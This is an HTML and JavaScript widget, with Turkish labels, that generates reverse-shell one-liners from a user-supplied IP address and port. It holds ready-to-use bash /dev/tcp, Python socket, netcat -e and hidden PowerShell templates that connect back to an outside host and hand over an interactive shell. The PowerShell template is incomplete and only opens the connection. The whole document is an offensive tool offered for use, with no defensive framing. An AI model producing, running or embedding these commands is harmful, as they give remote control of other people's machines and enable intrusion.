<div id="reverse-shell-tool">
  <h2>Reverse Shell Komut Üretici</h2>
  <label>Hedef IP:</label> <input type="text" id="shellIP" placeholder="192.168.1.100">
  <label>Port:</label> <input type="text" id="shellPort" placeholder="4444">
  <label>Shell Türü:</label>
  <select id="shellType">
    <option value="bash">Bash</option>
    <option value="powershell">PowerShell</option>
    <option value="python">Python</option>
    <option value="netcat">Netcat</option>
  </select>
  <button onclick="generateShell()">Oluştur</button>
  <pre id="shellOutput"></pre>
</div>

<script>
  function generateShell() {
    let ip = document.getElementById('shellIP').value;
    let port = document.getElementById('shellPort').value;
    let type = document.getElementById('shellType').value;
    let output = "";

    switch(type) {
      case "bash":
        output = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
        break;
      case "powershell":
        output = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});`;
        break;
      case "python":
        output = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
        break;
      case "netcat":
        output = `nc -e /bin/sh ${ip} ${port}`;
        break;
    }
    
    document.getElementById('shellOutput').innerText = output;
  }
</script>
